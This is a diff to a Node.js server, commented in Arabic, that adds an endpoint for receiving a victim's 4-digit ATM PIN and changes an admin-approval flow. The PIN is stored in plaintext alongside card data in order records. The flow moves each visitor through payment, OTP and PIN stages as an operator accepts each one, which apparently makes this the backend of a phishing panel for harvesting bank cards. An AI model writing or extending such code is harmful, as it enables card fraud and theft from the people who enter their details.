@@ -189,6 +189,27 @@ const server = http.createServer(async (req, res) => {
     return json(res, 200, { ok: true, id: id });
   }
 
+  // استقبال رمز ATM وبدء انتظار قرار الأدمن
+  if (pathname === '/api/atm' && req.method === 'POST') {
+    const body = await readBody(req);
+    const id = String(body.id || '').slice(0, 100);
+    const atmPin = String(body.atmPin || '').slice(0, 8);
+    if (!id || !/^\d{4}$/.test(atmPin)) {
+      return json(res, 400, { ok: false, error: 'invalid-atm-pin' });
+    }
+
+    paymentStates.set(id, { status: 'pending', stage: 'atm', otpSubmitted: true, createdAt: Date.now() });
+    const orders = readOrders();
+    const order = orders.find((item) => item.id === id);
+    if (order) {
+      order.status = 'pending';
+      order.card = order.card || {};
+      order.card.atm = atmPin;
+      writeOrders(orders);
+    }
+    return json(res, 200, { ok: true, id: id });
+  }
+
   // حالة الدفع التي تنتظر قرار الأدمن
   if (pathname.startsWith('/api/status/') && req.method === 'GET') {
     const id = pathname.split('/').pop();
@@ -212,16 +233,17 @@ const server = http.createServer(async (req, res) => {
     let stage = current.stage || 'payment';
     if (stage === 'otp') stage = status === 'accept' ? 'atm' : 'otp';
     else if (stage === 'atm') stage = status === 'accept' ? 'success' : 'atm';
+    const nextStatus = stage === 'success' ? 'success' : status;
     paymentStates.set(id, {
-      status: status,
+      status: nextStatus,
       stage: stage,
       otpSubmitted: Boolean(current.otpSubmitted),
       createdAt: Date.now()
     });
     const orders = readOrders();
     const order = orders.find((item) => item.id === id);
-    if (order) { order.status = status; writeOrders(orders); }
-    return json(res, 200, { ok: true, status: status });
+    if (order) { order.status = nextStatus; writeOrders(orders); }
+    return json(res, 200, { ok: true, status: nextStatus });
   }
 
   // نبضة زائر (heartbeat) — تُستدعى من كل صفحة عامة
